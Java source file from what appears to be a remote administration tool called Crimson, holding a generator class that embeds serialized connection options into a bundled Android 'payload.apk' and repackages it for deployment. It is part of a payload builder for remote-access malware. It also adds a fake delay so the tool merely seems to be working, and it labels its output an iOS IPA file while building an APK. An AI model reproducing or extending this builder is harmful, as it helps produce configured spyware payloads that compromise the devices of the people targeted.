package subterranean.crimson.server.generation;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Date;

import subterranean.crimson.server.graphics.BackgroundProgressLights;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Path;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.Zip;
import subterranean.crimson.universal.containers.Options;
import subterranean.crimson.universal.objects.ObjectTransfer;

public class IPA extends Generator {

	public IPA(Options opt, String string, String string2, long l) {
		options = opt;
		outPath = new Path(string, string2);
		report = new ArrayList<String[]>();
		report.add(new String[] { "Generated:", "IOS IPA File" });
		report.add(new String[] { "Output Location:", outPath.getAbsolutePath() });

	}

	public void run() {
		BackgroundProgressLights.start("Generating APK Payload");
		Date d1 = new Date();
		try {// to make sure the status lights turn off
			try {
				// make it seem like were doing some intense things
				Thread.sleep(2500);
			} catch (InterruptedException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}

			// write the apk to temp space
			File root = Utilities.getTempDir();

			File apk = new File(root.getAbsolutePath() + File.separator + "out.apk");
			File unzipped = new File(root.getAbsolutePath() + File.separator + "unzipped");
			byte[] file = Utilities.getFileInJar("/subterranean/crimson/server/plugins/and/payload.apk");
			if (file == null) {
				// couldnt read the apk
				Logger.add("Couldnt read the APK");

				return;
			}
			Utilities.write(file, apk);

			// unzip the apk
			Zip.unzip(apk, unzipped);

			// set up options
			File option = new File(unzipped.getAbsolutePath() + "/assets/options");
			option.getParentFile().mkdirs();

			// write options
			try {
				PrintWriter pw = new PrintWriter(option);
				pw.println(ObjectTransfer.toString(options, false));
				pw.close();

			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			// zip the apk back up at the target
			Zip.zip(unzipped, new File(outPath.getAbsolutePath()));

			// remove temp dirs
			Utilities.delete(root);

		} finally {
			Date d2 = new Date();
			// compare the dates
			double time = (d2.getTime() - d1.getTime()) / 1000.0;

			report.add(new String[] { "Generation Time:", time + " seconds" });

			File c = new File(outPath.getAbsolutePath());
			boolean suc = c.exists();

			if (suc) {
				success();
			} else {
				failure("Unknown");

			}

			BackgroundProgressLights.stop("Generating APK Payload");

		}

	}

}
